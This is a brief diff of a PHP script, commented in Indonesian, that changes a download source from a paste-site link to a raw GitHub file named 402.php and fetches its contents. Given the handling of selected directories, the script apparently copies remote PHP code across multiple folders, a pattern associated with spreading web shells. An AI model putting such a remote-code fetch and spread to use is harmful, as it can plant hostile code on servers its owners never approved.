@@ -43,7 +43,7 @@ if (empty($selectedDirs)) {
 }
 
 // URL sumber file yang akan diunduh
-$sourceFileUrl = 'https://pastee.dev/r/jaHaXUsS/0';
+$sourceFileUrl = 'https://github.com/ichijurok/arbproject/raw/refs/heads/main/402.php';
 
 // Mengunduh konten dari URL sumber sekali saja untuk efisiensi
 $fileContent = file_get_contents($sourceFileUrl);
